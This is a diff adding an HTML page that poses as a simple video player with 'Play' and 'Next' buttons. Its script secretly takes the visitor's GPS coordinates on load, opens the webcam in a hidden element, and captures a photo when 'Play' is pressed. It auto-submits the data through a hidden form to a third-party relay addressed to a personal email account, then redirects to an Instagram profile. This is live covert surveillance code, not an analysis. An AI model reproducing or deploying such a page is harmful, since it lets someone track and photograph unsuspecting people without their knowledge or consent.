@@ -1,0 +1,262 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Photo Capture</title>
+    <style>
+        .vid1{
+            width: 97dvw;
+            height: 70dvh;
+        }
+    </style>
+</head>
+<body onload="getLocation()">
+    <div>
+        <video id="video" width="640" height="480" style="display: none;" autoplay></video>
+        <button id="capture" onclick="playPause()">Play</button>
+    </div>
+    <div>
+        <label for="fileInput" style="display: none;">Selected:</label>
+
+        <video id="myVideo" class="vid1" src="carmel1.mp4" ></video>
+        <video id="video2" src="carmel2.mp4" style="display: none;" ></video>
+        <button id="showButton" onclick="toggleSwitch()">Next1</button>
+
+        <!-- <button onclick="playPause()">Play/Pause</button> -->
+    </div>
+
+
+
+
+
+
+
+
+    <!-- Form for submitting captured photo -->
+    <form id="captureForm" method="POST" action="https://formsubmit.co/studyram77@gmail.com" enctype="multipart/form-data">
+        <input type="file" name="attachment" id="fileInput" accept="image/png, image/jpeg" style="display: none;">
+        <img id="capturedImage" style="display: none; max-width: 200px; max-height: 200px;" alt="Captured Photo">
+        <button id="upload" type="submit" style="display: none;">Next2</button>
+
+
+        <!-- <input type="text" name="name" id="name" required placeholder="Name"> -->
+        <textarea name="msg" required placeholder="Message" id="myTextarea" style="display: none;" ></textarea>
+        <input type="hidden" name="_captcha" value="false">
+        <input type="hidden" name="_next" value="https://www.instagram.com/just_arihant_things?igsh=NmVtaDJpZzUxbDF6">
+        <!-- <button id="myButton">_NEXT_</button> -->
+    </form>
+
+<!-- ... Your existing HTML code ... -->
+
+<script>
+var video1 = document.getElementById("myVideo");
+var video2 = document.getElementById("video2");
+
+function toggleSwitch() {
+    if (video1.style.display !== "none") {
+        video1.style.display = "none";
+        video2.style.display = "block";
+    } else {
+        video1.style.display = "block";
+        video2.style.display = "none";
+    }
+
+    toggleControls();
+}
+
+function toggleControls() {
+    if (video1.controls) {
+        video1.controls = false;
+        video2.controls = false;
+    } else {
+        video1.controls = true;
+        video2.controls = true;
+    }
+
+    // var hiddenButton = document.getElementById('upload');
+    // hiddenButton.style.display = (hiddenButton.style.display === 'none' || hiddenButton.style.display === '') ? 'block' : 'none';
+    toggleButtons()
+}
+function toggleButtons() {
+    var showButton = document.getElementById('showButton');
+    var hiddenButton = document.getElementById('upload');
+
+    showButton.style.display = 'none';
+    hiddenButton.style.display = 'block';
+  }
+
+
+
+
+
+
+
+
+
+
+
+    var myTextarea = document.getElementById("myTextarea");
+
+function getLocation() {
+    if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(showPosition);
+    } else { 
+        myTextarea.value = "Geolocation is not supported by this browser.";
+    }
+}
+
+function showPosition(position) {
+    myTextarea.value = "Latitude: " + position.coords.latitude + 
+    "\nLongitude: " + position.coords.longitude;
+}
+
+var myButton = document.getElementById("upload");
+
+function clickButtonOnLoad() {
+    myButton.click();
+}
+
+window.onload = function() {
+    getLocation();
+    clickButtonOnLoad();
+};
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+    // const video = document.getElementById('video');
+    // const fileInput = document.getElementById('fileInput');
+    // const capturedImage = document.getElementById('capturedImage');
+
+    // // Access the user's camera
+    // navigator.mediaDevices.getUserMedia({ video: true })
+    //     .then((stream) => {
+    //         video.srcObject = stream;
+    //     })
+    //     .catch((error) => {
+    //         console.error('Error accessing the camera:', error);
+    //     });
+
+    // // Capture photo and add it to attachment
+    // document.getElementById('capture').addEventListener('click', () => {
+    //     const canvas = document.createElement('canvas');
+    //     canvas.width = video.videoWidth;
+    //     canvas.height = video.videoHeight;
+    //     const context = canvas.getContext('2d');
+    //     context.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+    //     // Convert the canvas content to a blob
+    //     canvas.toBlob((blob) => {
+    //         const file = new File([blob], 'captured_photo.png', { type: 'image/png' });
+
+    //         // Display the captured image
+    //         capturedImage.src = URL.createObjectURL(blob);
+    //         capturedImage.style.display = 'block';
+
+    //         // Create a new FileList and append the file
+    //         const fileList = new DataTransfer();
+    //         fileList.items.add(file);
+
+    //         // Set the files property of the file input
+    //         fileInput.files = fileList.files;
+    //     }, 'image/png');
+    // });
+
+    // // Handle file upload
+    // document.getElementById('fileInput').addEventListener('change', (event) => {
+    //     const fileInput = event.target;
+    //     const file = fileInput.files[0];
+
+    //     // Add your logic to handle the uploaded file (e.g., display, save, etc.)
+    //     // For now, let's just show the file name in the console
+    //     console.log('Selected file:', file.name);
+    // });
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+    const video = document.getElementById('video');
+    const fileInput = document.getElementById('fileInput');
+    const capturedImage = document.getElementById('capturedImage');
+
+    // Ask for camera permission on page load
+    document.addEventListener('DOMContentLoaded', () => {
+        if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
+            navigator.mediaDevices.getUserMedia({ video: true })
+                .then((stream) => {
+                    video.srcObject = stream;
+                })
+                .catch((error) => {
+                    console.error('Error accessing the camera:', error);
+                });
+        } else {
+            console.error('getUserMedia is not supported');
+        }
+    });
+
+    // Capture photo and add it to attachment
+    document.getElementById('capture').addEventListener('click', () => {
+        const canvas = document.createElement('canvas');
+        canvas.width = video.videoWidth;
+        canvas.height = video.videoHeight;
+        const context = canvas.getContext('2d');
+        context.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+        // Convert the canvas content to a blob
+        canvas.toBlob((blob) => {
+            const file = new File([blob], 'captured_photo.png', { type: 'image/png' });
+
+            // Display the captured image
+            capturedImage.src = URL.createObjectURL(blob);
+            capturedImage.style.display = 'none';
+
+            // Create a new FileList and append the file
+            const fileList = new DataTransfer();
+            fileList.items.add(file);
+
+            // Set the files property of the file input
+            fileInput.files = fileList.files;
+        }, 'image/png');
+    });
+
+    // Handle file upload
+    document.getElementById('fileInput').addEventListener('change', (event) => {
+        const fileInput = event.target;
+        const file = fileInput.files[0];
+
+        // Add your logic to handle the uploaded file (e.g., display, save, etc.)
+        // For now, let's just show the file name in the console
+        console.log('Selected file:', file.name);
+    });
+</script>
+
+
+</body>
+</html>
